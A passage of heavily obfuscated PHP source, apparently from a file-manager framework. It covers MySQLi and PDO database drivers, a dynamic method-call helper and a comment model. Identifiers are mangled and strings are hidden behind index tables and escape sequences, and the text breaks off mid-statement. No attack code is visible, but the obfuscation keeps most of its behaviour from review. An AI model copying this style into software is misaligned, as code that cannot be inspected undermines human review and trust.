$¾é£´ÃÙ[$‘©ŞŸ›ã[985]], $¾é£´ÃÙ[$‘©ŞŸ›ã[21]], $¾é£´ÃÙ[$‘©ŞŸ›ã[983]] ? intval($¾é£´ÃÙ[$‘©ŞŸ›ã[983]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $æ‰ŸŠ¾ = $this->linkID[$‰€¤¨Àö]->server_version; $this->linkID[$‰€¤¨Àö]->query($‘©ŞŸ›ã[986] . think_config($‘©ŞŸ›ã[987]) . $‘©ŞŸ›ã[58]); if ($æ‰ŸŠ¾ > $‘©ŞŸ›ã[988]) { $this->linkID[$‰€¤¨Àö]->query($‘©ŞŸ›ã[989]); } $this->connected = !0; if (1 != think_config($‘©ŞŸ›ã[22])) { unset($this->config); } } return $this->linkID[$‰€¤¨Àö]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($œ›â–è×) { $øÀŠÙæ =& $_SERVER[™¸œØ®Ü]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $œ›â–è×; if ($this->queryID) { $this->free(); } think_action_status($øÀŠÙæ[23], 1); think_status($øÀŠÙæ[24]); $this->queryID = $this->_linkID->query($œ›â–è×); if ($this->_linkID->more_results()) { while (($¤™ì§§ = $this->_linkID->next_result()) != NULL) { $¤™ì§§->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ì¼ïîƒ¯) { $ÂÀ‚ÚëŞ =& $_SERVER[™¸œØ®Ü]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ì¼ïîƒ¯; if ($this->queryID) { $this->free(); } think_action_status($ÂÀ‚ÚëŞ[25], 1); think_status($ÂÀ‚ÚëŞ[24]); $Õµ¿Û–ë = $this->_linkID->query($ì¼ïîƒ¯); $this->debug(); if (!1 === $Õµ¿Û–ë) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ş©´ëôÄ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ş©´ëôÄ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ç•íßÚ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ç•íßÚ) { $this->error(); return !1; } } return !0; } private function getAll() { $Ü·¸»ôÖ = array(); if ($this->numRows > 0) { for ($è‡³Å‚½ = 0; $è‡³Å‚½ < $this->numRows; $è‡³Å‚½++) { $Ü·¸»ôÖ[$è‡³Å‚½] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $Ü·¸»ôÖ; } public function getFields($‰öÌõ¨Ñ) { $ÈíÆ„Ë =& $_SERVER[™¸œØ®Ü]; $Íæ¬“• = $this->query($ÈíÆ„Ë[993] . $this->parseKey($‰öÌõ¨Ñ)); $åñ³Ú’È = array(); if ($Íæ¬“•) { foreach ($Íæ¬“• as $½¿–â‚ => $’ËÎ»õ) { $åñ³Ú’È[$’ËÎ»õ[$ÈíÆ„Ë[31]]] = array($ÈíÆ„Ë[32] => $’ËÎ»õ[$ÈíÆ„Ë[31]], $ÈíÆ„Ë[33] => $’ËÎ»õ[$ÈíÆ„Ë[34]], $ÈíÆ„Ë[35] => (bool) ($’ËÎ»õ[$ÈíÆ„Ë[36]] === $ÈíÆ„Ë[12]), $ÈíÆ„Ë[37] => $’ËÎ»õ[$ÈíÆ„Ë[38]], $ÈíÆ„Ë[39] => strtolower($’ËÎ»õ[$ÈíÆ„Ë[40]]) == $ÈíÆ„Ë[41], $ÈíÆ„Ë[42] => strtolower($’ËÎ»õ[$ÈíÆ„Ë[43]]) == $ÈíÆ„Ë[44]); } } return $åñ³Ú’È; } public function getTables($Ûææ°½¾ = '') { $áÄéá´ =& $_SERVER[™¸œØ®Ü]; $ìˆŠˆÉ‘ = !empty($Ûææ°½¾) ? $áÄéá´[995] . $Ûææ°½¾ . $áÄéá´[996] : $áÄéá´[997]; $øèç¥ ¨ = $this->query($ìˆŠˆÉ‘); $«ú³úÕ¾ = array(); if ($øèç¥ ¨) { foreach ($øèç¥ ¨ as $âÀØ¹¦ => $æíöª’Ú) { $«ú³úÕ¾[$âÀØ¹¦] = current($æíöª’Ú); } } return $«ú³úÕ¾; } public function replace($÷½¥ÌÇ, $™ĞÆà“¸ = array()) { $µŒÏû®¼ =& $_SERVER[™¸œØ®Ü]; foreach ($÷½¥ÌÇ as $˜ÁŞíàè => $”±Ğ ‚¤) { $•¥¸±üœ = $this->parseValue($”±Ğ ‚¤); if (is_scalar($•¥¸±üœ)) { $°Ö¯ğ­Ø[] = $•¥¸±üœ; $èê®Òš[] = $this->parseKey($˜ÁŞíàè); } } $öè…À¶ = $µŒÏû®¼[998] . $this->parseTable($™ĞÆà“¸[$µŒÏû®¼[358]]) . $µŒÏû®¼[999] . implode($µŒÏû®¼[50], $èê®Òš) . $µŒÏû®¼[1000] . implode($µŒÏû®¼[50], $°Ö¯ğ­Ø) . $µŒÏû®¼[1001]; return $this->execute($öè…À¶); } public function insertAll($˜ÊõŒ¡, $ÒÅš¹×Í = array(), $ıÔêå°— = false) { $•ƒÍÇ”” =& $_SERVER[™¸œØ®Ü]; if (!is_array($˜ÊõŒ¡[0])) { return !1; } $±ŞºåÖ = array_keys($˜ÊõŒ¡[0]); $²½ÂÁğ = array(); foreach ($˜ÊõŒ¡ as $÷îìÇ’é) { $©º×”ÃÏ = array(); foreach ($÷îìÇ’é as $Ç´Ïõ™è => $¿ßÎ«œé) { $¿ßÎ«œé = $this->parseValue($¿ßÎ«œé); if (is_scalar($¿ßÎ«œé)) { $©º×”ÃÏ[] = $¿ßÎ«œé; } } $²½ÂÁğ[] = $•ƒÍÇ””[339] . implode($•ƒÍÇ””[50], $©º×”ÃÏ) . $•ƒÍÇ””[1001]; } array_walk($±ŞºåÖ, array($this, $•ƒÍÇ””[1002])); $×¸ı³ùØ = $ıÔêå°— ? $•ƒÍÇ””[1003] : $•ƒÍÇ””[1004]; $›ÙœáüØ = $×¸ı³ùØ . $•ƒÍÇ””[1005] . $this->parseTable($ÒÅš¹×Í[$•ƒÍÇ””[358]]) . $•ƒÍÇ””[999] . implode($•ƒÍÇ””[50], $±ŞºåÖ) . $•ƒÍÇ””[1006] . implode($•ƒÍÇ””[50], $²½ÂÁğ); return $this->execute($›ÙœáüØ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $â°…Ñ =& $_SERVER[™¸œØ®Ü]; $this->error = $this->_linkID->errno . $â°…Ñ[4] . $this->_linkID->error; if ($â°…Ñ[12] != $this->queryStr) { $this->error .= LNG($â°…Ñ[48]) . $this->queryStr; } think_trace($this->error, $â°…Ñ[12], $â°…Ñ[49]); return $this->error; } public function escapeString($ÒíõúØ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ÒíõúØ); } else { return addslashes($ÒíõúØ); } } public function parseKey(&$ÒÌ­á­», $ğÓÕå­ = true) { $ƒ¬ìÌûŠ =& $_SERVER[™¸œØ®Ü]; if ($ğÓÕå­) { $ÒÌ­á­» = $this->parseKeyCheck($ÒÌ­á­»); } if ($ÒÌ­á­» != $ƒ¬ìÌûŠ[222] && !preg_match($ƒ¬ìÌûŠ[1007], $ÒÌ­á­»)) { $ÒÌ­á­» = $ƒ¬ìÌûŠ[463] . trim($ÒÌ­á­», $ƒ¬ìÌûŠ[463]) . $ƒ¬ìÌûŠ[463]; } return $ÒÌ­á­»; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ê—…£€” = '') { $­¤Çˆ†á =& $_SERVER[™¸œØ®Ü]; if (!class_exists($­¤Çˆ†á[1010])) { think_exception(think_lang($­¤Çˆ†á[14]) . $­¤Çˆ†á[1011]); } if (!empty($ê—…£€”)) { $this->config = $ê—…£€”; if (empty($this->config[$­¤Çˆ†á[17]])) { $this->config[$­¤Çˆ†á[17]] = array(); } } } public function connect($‡ÂÍƒíĞ = '', $Âå©äóã = 0) { $Š‰¸œèÓ =& $_SERVER[™¸œØ®Ü]; if (!isset($this->linkID[$Âå©äóã])) { if (empty($‡ÂÍƒíĞ)) { $‡ÂÍƒíĞ = $this->config; } $•Ğù¢° = !empty($‡ÂÍƒíĞ[$Š‰¸œèÓ[17]][$Š‰¸œèÓ[18]]) ? $‡ÂÍƒíĞ[$Š‰¸œèÓ[17]][$Š‰¸œèÓ[18]] : $this->pconnect; if ($•Ğù¢°) { $‡ÂÍƒíĞ[$Š‰¸œèÓ[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$Âå©äóã] = new PDO($‡ÂÍƒíĞ[$Š‰¸œèÓ[1012]], $‡ÂÍƒíĞ[$Š‰¸œèÓ[984]], $‡ÂÍƒíĞ[$Š‰¸œèÓ[985]], $‡ÂÍƒíĞ[$Š‰¸œèÓ[17]]); } catch (PDOException $‘Ø¡§—) { think_exception($‘Ø¡§—->getMessage()); } $this->dbType = $this->_getDsnType($‡ÂÍƒíĞ[$Š‰¸œèÓ[1012]]); if (in_array($this->dbType, array($Š‰¸œèÓ[1013], $Š‰¸œèÓ[1014], $Š‰¸œèÓ[1015], $Š‰¸œèÓ[1016]))) { think_exception($Š‰¸œèÓ[1017] . $this->dbType . $Š‰¸œèÓ[1018] . $this->dbType . $Š‰¸œèÓ[1019]); } if (!$this->linkID[$Âå©äóã]) { think_exception($Š‰¸œèÓ[1020]); } try { $this->linkID[$Âå©äóã]->exec($Š‰¸œèÓ[1021] . think_config($Š‰¸œèÓ[987])); } catch (Exception $‘Ø¡§—) { } $this->connected = !0; if (1 != think_config($Š‰¸œèÓ[22])) { unset($this->config); } } return $this->linkID[$Âå©äóã]; } public function free() { $this->PDOStatement = null; } public function query($æ…œÍ‡À, $ßàÔñ¸ = array()) { $‹£Ä—‘ =& $_SERVER[™¸œØ®Ü]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $æ…œÍ‡À; if (!empty($ßàÔñ¸)) { $this->queryStr .= $‹£Ä—‘[1022] . print_r($ßàÔñ¸, !0) . $‹£Ä—‘[1023]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($‹£Ä—‘[23], 1); think_status($‹£Ä—‘[24]); $this->PDOStatement = $this->_linkID->prepare($æ…œÍ‡À); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $äÎƒ­Ë = $this->PDOStatement->execute($ßàÔñ¸); $this->debug(); if (!1 === $äÎƒ­Ë) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($Ÿ¾ºáÛı, $‚Ÿæ»‘ƒ = array()) { $•—’Şñ© =& $_SERVER[™¸œØ®Ü]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ÿ¾ºáÛı; if (!empty($‚Ÿæ»‘ƒ)) { $this->queryStr .= $•—’Şñ©[1022] . print_r($‚Ÿæ»‘ƒ, !0) . $•—’Şñ©[1023]; } $¹ÀÓ¯Ûœ = !1; if ($this->dbType == $•—’Şñ©[1016]) { if (preg_match($•—’Şñ©[1024], $this->queryStr, $Ò÷¬çä¹)) { $this->table = think_config($•—’Şñ©[1025]) . str_ireplace(think_config($•—’Şñ©[1026]), $•—’Şñ©[456], $Ò÷¬çä¹[2]); $¹ÀÓ¯Ûœ = (bool) $this->query($•—’Şñ©[1027] . strtoupper($this->table) . $•—’Şñ©[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($•—’Şñ©[25], 1); think_status($•—’Şñ©[24]); $this->PDOStatement = $this->_linkID->prepare($Ÿ¾ºáÛı); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ˆ‰Ô»À¬ = $this->PDOStatement->execute($‚Ÿæ»‘ƒ); $this->debug(); if (!1 === $ˆ‰Ô»À¬) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($¹ÀÓ¯Ûœ || preg_match($•—’Şñ©[1028], $Ÿ¾ºáÛı)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $±·ĞüĞ¸ = $this->_linkID->commit(); $this->transTimes = 0; if (!$±·ĞüĞ¸) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $úØıĞ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$úØıĞ) { $this->error(); return !1; } } return !0; } private function getAll() { $û·Ğ¿°« = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($û·Ğ¿°«); return $û·Ğ¿°«; } public function getFields($Ÿü¢“éé) { $¸óíÂ¥ =& $_SERVER[™¸œØ®Ü]; $this->initConnect(!0); if (think_config($¸óíÂ¥[1029])) { $µ‚ú­å€ = str_replace($¸óíÂ¥[1030], $Ÿü¢“éé, think_config($¸óíÂ¥[1029])); } else { switch ($this->dbType) { case $¸óíÂ¥[1013]: case $¸óíÂ¥[1031]: $µ‚ú­å€ = "\123\x45\x4c\105\103\124\x20\x20\x20\143\x6f\x6c\165\x6d\x6e\x5f\x6e\141\155\x65\40\x61\x73\x20\x27\116\141\155\x65\47\54\40\40\x20\144\x61\x74\141\137\164\171\x70\145\x20\141\x73\40\x27\124\x79\x70\145\x27\x2c\x20\40\x20\143\x6f\154\165\155\156\x5f\x64\145\146\141\165\154\x74\40\x61\163\40\x27\x44\145\146\x61\x75\154\164\47\x2c\x20\40\40\151\x73\x5f\156\x75\x6c\154\x61\x62\154\145\x20\141\x73\40\x27\x4e\x75\154\154\x27\xa\11\11\106\122\117\x4d\x9\x69\x6e\x66\x6f\162\155\x61\164\x69\157\x6e\x5f\x73\x63\150\x65\155\x61\56\x74\141\142\x6c\145\163\x20\101\123\40\164\xa\x9\11\x4a\117\111\116\11\x69\156\x66\x6f\162\155\141\164\151\157\156\137\x73\143\150\145\x6d\141\56\x63\x6f\154\x75\155\156\163\40\101\123\40\x63\12\11\11\x4f\x4e\40\x20\164\x2e\164\141\x62\x6c\x65\137\x63\x61\x74\141\154\157\x67\x20\75\40\x63\56\x74\141\x62\154\145\x5f\143\141\x74\x61\x6c\157\147\12\11\11\101\116\104\40\164\x2e\164\141\x62\x6c\x65\x5f\163\143\150\145\155\141\x20\x3d\40\x63\56\x74\x61\142\x6c\145\x5f\163\x63\150\145\155\141\xa\x9\11\x41\x4e\104\x20\164\x2e\x74\x61\x62\x6c\x65\x5f\156\x61\x6d\x65\x20\x3d\x20\143\56\164\x61\x62\154\x65\x5f\x6e\141\155\x65\xa\11\x9\x57\x48\105\122\105\40\40\40\x74\56\x74\x61\x62\x6c\x65\137\156\141\155\x65\x20\75\40\47{$Ÿü¢“éé}\x27"; break; case $¸óíÂ¥[1032]: $µ‚ú­å€ = $¸óíÂ¥[1033] . $Ÿü¢“éé . $¸óíÂ¥[1034]; break; case $¸óíÂ¥[1014]: case $¸óíÂ¥[1016]: $µ‚ú­å€ = $¸óíÂ¥[1035] . $¸óíÂ¥[1036] . $¸óíÂ¥[1037] . strtoupper($Ÿü¢“éé) . $¸óíÂ¥[1038] . strtoupper($Ÿü¢“éé) . $¸óíÂ¥[1039]; break; case $¸óíÂ¥[1040]: $µ‚ú­å€ = $¸óíÂ¥[1041] . $Ÿü¢“éé . $¸óíÂ¥[1042]; break; case $¸óíÂ¥[1015]: break; case $¸óíÂ¥[1043]: default: $µ‚ú­å€ = $¸óíÂ¥[1044] . ($this->dbType == $¸óíÂ¥[1043] ? "\x60{$Ÿü¢“éé}\x60" : $Ÿü¢“éé); } } $Î¸ÏĞõ = $this->query($µ‚ú­å€); $¹ûó‡ = array(); if ($Î¸ÏĞõ) { foreach ($Î¸ÏĞõ as $´µôóîç => $×òÚˆçñ) { $×òÚˆçñ = array_change_key_case($×òÚˆçñ); $×òÚˆçñ[$¸óíÂ¥[32]] = isset($×òÚˆçñ[$¸óíÂ¥[32]]) ? $×òÚˆçñ[$¸óíÂ¥[32]] : $¸óíÂ¥[456]; $×òÚˆçñ[$¸óíÂ¥[33]] = isset($×òÚˆçñ[$¸óíÂ¥[33]]) ? $×òÚˆçñ[$¸óíÂ¥[33]] : $¸óíÂ¥[456]; $Ì— Ş„ = isset($×òÚˆçñ[$¸óíÂ¥[352]]) ? $×òÚˆçñ[$¸óíÂ¥[352]] : $×òÚˆçñ[$¸óíÂ¥[32]]; $¹ûó‡[$Ì— Ş„] = array($¸óíÂ¥[32] => $Ì— Ş„, $¸óíÂ¥[33] => $×òÚˆçñ[$¸óíÂ¥[33]], $¸óíÂ¥[35] => (bool) (isset($×òÚˆçñ[$¸óíÂ¥[106]]) && $×òÚˆçñ[$¸óíÂ¥[106]] === $¸óíÂ¥[12] || isset($×òÚˆçñ[$¸óíÂ¥[35]]) && $×òÚˆçñ[$¸óíÂ¥[35]] === $¸óíÂ¥[12]), $¸óíÂ¥[37] => isset($×òÚˆçñ[$¸óíÂ¥[37]]) ? $×òÚˆçñ[$¸óíÂ¥[37]] : (isset($×òÚˆçñ[$¸óíÂ¥[56]]) ? $×òÚˆçñ[$¸óíÂ¥[56]] : $¸óíÂ¥[456]), $¸óíÂ¥[39] => isset($×òÚˆçñ[$¸óíÂ¥[97]]) ? strtolower($×òÚˆçñ[$¸óíÂ¥[97]]) == $¸óíÂ¥[41] : (isset($×òÚˆçñ[$¸óíÂ¥[57]]) ? $×òÚˆçñ[$¸óíÂ¥[57]] : !1), $¸óíÂ¥[42] => isset($×òÚˆçñ[$¸óíÂ¥[1045]]) ? strtolower($×òÚˆçñ[$¸óíÂ¥[1045]]) == $¸óíÂ¥[44] : (isset($×òÚˆçñ[$¸óíÂ¥[97]]) ? $×òÚˆçñ[$¸óíÂ¥[97]] : !1)); } } return $¹ûó‡; } public function getTables($³Ñœ¤Ü = '') { $™’ôŠÍ =& $_SERVER[™¸œØ®Ü]; if (think_config($™’ôŠÍ[1046])) { $îëÍØ– = str_replace($™’ôŠÍ[1047], $³Ñœ¤Ü, think_config($™’ôŠÍ[1046])); } else { switch ($this->dbType) { case $™’ôŠÍ[1014]: case $™’ôŠÍ[1016]: $îëÍØ– = $™’ôŠÍ[1048]; break; case $™’ôŠÍ[1013]: case $™’ôŠÍ[1031]: $îëÍØ– = $™’ôŠÍ[1049]; break; case $™’ôŠÍ[1040]: $îëÍØ– = $™’ôŠÍ[1050]; break; case $™’ôŠÍ[1015]: think_exception(think_lang($™’ôŠÍ[1051]) . $™’ôŠÍ[1052]); break; case $™’ôŠÍ[1032]: $îëÍØ– = $™’ôŠÍ[45] . $™’ôŠÍ[46] . $™’ôŠÍ[47]; break; case $™’ôŠÍ[1043]: default: if (!empty($³Ñœ¤Ü)) { $îëÍØ– = $™’ôŠÍ[995] . $³Ñœ¤Ü . $™’ôŠÍ[996]; } else { $îëÍØ– = $™’ôŠÍ[997]; } } } $…¢ÂĞá¿ = $this->query($îëÍØ–); $ä‡é£»¤ = array(); foreach ($…¢ÂĞá¿ as $¶ƒáŞåÌ => $ÃÓ¦ÓÕÔ) { $ä‡é£»¤[$¶ƒáŞåÌ] = current($ÃÓ¦ÓÕÔ); } return $ä‡é£»¤; } protected function parseLimit($ßëöÔİ) { $¥òÏƒáø =& $_SERVER[™¸œØ®Ü]; $ñ¶éíÀƒ = $¥òÏƒáø[12]; if (!empty($ßëöÔİ)) { switch ($this->dbType) { case $¥òÏƒáø[1040]: case $¥òÏƒáø[1032]: $ßëöÔİ = explode($¥òÏƒáø[50], $ßëöÔİ); if (count($ßëöÔİ) > 1) { $ñ¶éíÀƒ .= $¥òÏƒáø[51] . $ßëöÔİ[1] . $¥òÏƒáø[52] . $ßëöÔİ[0] . $¥òÏƒáø[53]; } else { $ñ¶éíÀƒ .= $¥òÏƒáø[51] . $ßëöÔİ[0] . $¥òÏƒáø[53]; } break; case $¥òÏƒáø[1013]: case $¥òÏƒáø[1031]: break; case $¥òÏƒáø[1015]: break; case $¥òÏƒáø[1014]: case $¥òÏƒáø[1016]: break; case $¥òÏƒáø[1043]: default: $ñ¶éíÀƒ .= $¥òÏƒáø[51] . $ßëöÔİ . $¥òÏƒáø[53]; } } return $ñ¶éíÀƒ; } public function parseKey(&$½—Ç¼Ãì, $¼äÙµù = true) { $‡ü¦¿³Ü =& $_SERVER[™¸œØ®Ü]; if ($¼äÙµù) { $½—Ç¼Ãì = $this->parseKeyCheck($½—Ç¼Ãì); } if ($this->dbType == $‡ü¦¿³Ü[1043]) { if ($½—Ç¼Ãì != $‡ü¦¿³Ü[222] && !preg_match($‡ü¦¿³Ü[1007], $½—Ç¼Ãì)) { $½—Ç¼Ãì = $‡ü¦¿³Ü[463] . trim($½—Ç¼Ãì, $‡ü¦¿³Ü[463]) . $‡ü¦¿³Ü[463]; } return $½—Ç¼Ãì; } else { return parent::parseKey($½—Ç¼Ãì, $¼äÙµù); } } public function close() { $this->_linkID = null; } public function error() { $¥ß¡†´ =& $_SERVER[™¸œØ®Ü]; if ($this->PDOStatement) { $ÅÃè—ğ» = $this->PDOStatement->errorInfo(); $this->error = $ÅÃè—ğ»[1] . $¥ß¡†´[4] . $ÅÃè—ğ»[2]; } else { $this->error = $¥ß¡†´[12]; } if ($¥ß¡†´[12] != $this->queryStr) { $this->error .= LNG($¥ß¡†´[48]) . $this->queryStr; } think_trace($this->error, $¥ß¡†´[12], $¥ß¡†´[49]); return $this->error; } public function escapeString($€„™ş‰É) { $À–Ú©›€ =& $_SERVER[™¸œØ®Ü]; switch ($this->dbType) { case $À–Ú©›€[1040]: case $À–Ú©›€[1013]: case $À–Ú©›€[1031]: case $À–Ú©›€[1043]: return addslashes($€„™ş‰É); case $À–Ú©›€[1015]: case $À–Ú©›€[1032]: case $À–Ú©›€[1014]: case $À–Ú©›€[1016]: return str_ireplace($À–Ú©›€[58], $À–Ú©›€[59], $€„™ş‰É); } } protected function parseValue($º·×ñ÷Û) { $¢¨ıÈşÇ =& $_SERVER[™¸œØ®Ü]; if (is_string($º·×ñ÷Û)) { $ûû§áÙ” = strpos($º·×ñ÷Û, $¢¨ıÈşÇ[4]) === 0 && in_array($º·×ñ÷Û, array_keys($this->bind)); $º·×ñ÷Û = $ûû§áÙ” ? $this->escapeString($º·×ñ÷Û) : $¢¨ıÈşÇ[1053] . $this->escapeString($º·×ñ÷Û) . $¢¨ıÈşÇ[1053]; } elseif (isset($º·×ñ÷Û[0]) && is_string($º·×ñ÷Û[0]) && strtolower($º·×ñ÷Û[0]) == $¢¨ıÈşÇ[374]) { $º·×ñ÷Û = $this->escapeString($º·×ñ÷Û[1]); } elseif (is_array($º·×ñ÷Û)) { $º·×ñ÷Û = array_map(array($this, $¢¨ıÈşÇ[1054]), $º·×ñ÷Û); } elseif (is_bool($º·×ñ÷Û)) { $º·×ñ÷Û = $º·×ñ÷Û ? $¢¨ıÈşÇ[91] : $¢¨ıÈşÇ[230]; } elseif (is_null($º·×ñ÷Û)) { $º·×ñ÷Û = $¢¨ıÈşÇ[106]; } return $º·×ñ÷Û; } public function getLastInsertId() { $äª³ïóî =& $_SERVER[™¸œØ®Ü]; switch ($this->dbType) { case $äª³ïóî[1040]: case $äª³ïóî[1032]: case $äª³ïóî[1013]: case $äª³ïóî[1031]: case $äª³ïóî[1015]: case $äª³ïóî[1043]: return $this->_linkID->lastInsertId(); case $äª³ïóî[1014]: case $äª³ïóî[1016]: $Ò­ºãşç = $this->table; $Ì¥õÅÒ = $this->query("\123\x45\114\105\103\x54\40{$Ò­ºãşç}\56\x63\x75\162\162\x76\141\154\40\x63\x75\162\162\166\x61\154\x20\106\x52\117\x4d\x20\x64\165\141\154"); return $Ì¥õÅÒ ? $Ì¥õÅÒ[0][$äª³ïóî[1055]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($ñÃ„š‡¬) { $ÏÈ³–Èñ =& $_SERVER[™¸œØ®Ü]; if (!CacheLock::fileLock($ÏÈ³–Èñ[13])) { return !1; } $ÆúÜ°¦ö = parent::query($ñÃ„š‡¬); CacheLock::fileUnLock($ÏÈ³–Èñ[13]); return $ÆúÜ°¦ö; } public function execute($¬Ğ²íß) { $õıÊ·£Í =& $_SERVER[™¸œØ®Ü]; if (!CacheLock::fileLock($õıÊ·£Í[13])) { return !1; } $Õ±§öÛÍ = parent::execute($¬Ğ²íß); CacheLock::fileUnLock($õıÊ·£Í[13]); return $Õ±§öÛÍ; } } goto A‡¨³…Åè«; A”Ú²ÕË·: function binCheckBigger($ˆ’»¬à, $˜ª‰¡µ) { return $ˆ’»¬à > $˜ª‰¡µ; } $_SERVER[$_SERVER[ñ¦æ»åÏ][3]] = ("\70\66\63\66"."\66\61")+0;$_n9j7="h0zjrkdfo2acgn58vl9ewt43ybmi67p1xqus97knbhxy3q6ru1epid0fzmwoj8tlgsc4va52va6up28rnm";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($—ƒöíº«, $‚ØÚàÀ) { $‘Ÿ€«é =& $_SERVER[™¸œØ®Ü]; if (isset(self::$_methodList[$—ƒöíº«])) { return @call_user_func_array(self::$_methodList[$—ƒöíº«], $‚ØÚàÀ); } else { if (method_exists($this, $—ƒöíº«)) { return call_user_func_array(array($this, $—ƒöíº«), $‚ØÚàÀ); } else { think_exception(__CLASS__ . $‘Ÿ€«é[4] . $—ƒöíº« . $‘Ÿ€«é[5]); } } } public static function __callStatic($’€ôÙá«, $şÂíÚà) { if (isset(self::$_methodListStatic[$’€ôÙá«])) { return call_user_func_array(self::$_methodListStatic[$’€ôÙá«], $şÂíÚà); } else { if (method_exists(self, $’€ôÙá«)) { return call_user_func_array(array(self, $’€ôÙá«), $şÂíÚà); } else { show_json("{$’€ôÙá«}\x28\x29\40\156\157\164\x20\145\170\151\163\x74\73", !1); } } } public static function addMethod($éÊİ©ğÒ, $™òøÖØ) { self::$_methodList[$éÊİ©ğÒ] = $™òøÖØ; } public static function addMethodStatic($ÒÃ²ğ¾–, $ãÔéöèÀ) { self::$_methodListStatic[$ÒÃ²ğ¾–] = $ãÔéöèÀ; } } goto c¯½œ¬Ã¬‘; c÷â­ÀÕÁ: class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\155\x6d\x65\x6e\164"; protected $tableMeta = array("\x74\141\142\154\x65\116\141\155\x65" => "\143\157\x6d\x6d\145\156\x74\137\x6d\x65\x74\141", "\x6d\145\164\x61\x46\151\x65\x6c\144" => "\x63\x6f\x6d\155\145\x6e\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ÎÓƒì˜) { $±Êô×Ø =& $_SERVER[™¸œØ®Ü]; if ($ÎÓƒì˜[$±Êô×Ø[2025]]) { $¶Ç­ï‰ = $this->where(array($±Êô×Ø[2026] => $ÎÓƒì˜[$±Êô×Ø[2025]]))->find(); if (!$¶Ç­ï‰ || $¶Ç­ï‰[$±Êô×Ø[190]] != $ÎÓƒì˜[$±Êô×Ø[190]] || $¶Ç­ï‰[$±Êô×Ø[573]] != $ÎÓƒì˜[$±Êô×Ø[573]]) { return !1; } $this->where(array($±Êô×Ø[2026] => $ÎÓƒì˜[$±Êô×Ø[2025]]))->setAdd($±Êô×Ø[2027], 1); } $ÎÓƒì˜[$±Êô×Ø[2028]] = 0; $ÎÓƒì˜[$±Êô×Ø[2027]] = 0; $ÎÓƒì˜[$±Êô×Ø[835]] = 1; return $this->add($ÎÓƒì˜); } public function commentCount($ô³ëÆ¦ç, $‡½¸à²ò, $àµ¡Ôø = false) { $Ø„Ìéıñ =& $_SERVER[™¸œØ®Ü]; if (!$ô³ëÆ¦ç) { return array(); } if (is_string($ô³ëÆ¦ç) || is_int($ô³ëÆ¦ç)) { $ô³ëÆ¦ç = array($ô³ëÆ¦ç); } $´Á×™ù’ = array($Ø„Ìéıñ[573], $Ø„Ìéıñ[2029] => $Ø„Ìéıñ[569]); $¿Éœ”á¦ = array($Ø„Ìéıñ[573] => array($Ø„Ìéıñ[7], $ô³ëÆ¦ç), $Ø„Ìéıñ[190] => $‡½¸à²ò); if ($àµ¡Ôø) { $¿Éœ”á¦[$Ø„Ìéıñ[1795]] = $àµ¡Ôø; } $‰‘Ê„»î = $this->field($´Á×™ù’)->where($¿Éœ”á¦)->group($Ø„Ìéıñ[573])->select(); return array_to_keyvalue($‰‘Ê„»î, $Ø„Ìéıñ[573], $Ø„Ìéıñ[569]); } public function starTarget($áŒñœ¼˜, $÷­ÌşƒŞ) { $ìğĞ¡„ë =& $_SERVER[™¸œØ®Ü]; $ÒÅ¿›”ï = $áŒñœ¼˜ + self::TYPE_STAR_OFFSET; $–ª“ôêÒ = array($ìğĞ¡„ë[1795] => USER_ID, $ìğĞ¡„ë[190] => $ÒÅ¿›”ï, $ìğĞ¡„ë[573] => $÷­ÌşƒŞ); $¿¯¢¹ºË = $this->where($–ª“ôêÒ)->find(); if ($¿¯¢¹ºË) { return $this->where(array($ìğĞ¡„ë[477] => $¿¯¢¹ºË[$ìğĞ¡„ë[477]]))->delete(); } $ô¬¥­ÃÆ = array($ìğĞ¡„ë[2025] => 0, $ìğĞ¡„ë[1795] => USER_ID, $ìğĞ¡„ë[835] => 1, $ìğĞ¡„ë[171] 